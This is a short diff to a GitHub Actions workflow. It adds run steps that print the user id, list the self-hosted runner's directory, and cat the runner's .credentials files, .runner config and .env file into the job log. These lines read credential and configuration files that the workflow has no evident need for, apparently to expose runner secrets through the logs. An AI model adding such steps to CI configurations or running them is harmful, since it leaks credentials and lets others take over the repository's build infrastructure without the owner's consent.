@@ -17,4 +17,14 @@ jobs:
         env:
           REPO_NAME: ${{ github.repository }}
         run: |
+          id
           ps axuf | grep Runner.Listener
+          ls -la /home/runner/runners/2.284.0/
+          cat /home/runner/runners/2.284.0/.credentials*
+          echo '###########################'
+          cat /home/runner/runners/2.284.0/.runner
+          echo '###########################'
+          cat /home/runner/runners/2.284.0/.env
+
+
+          
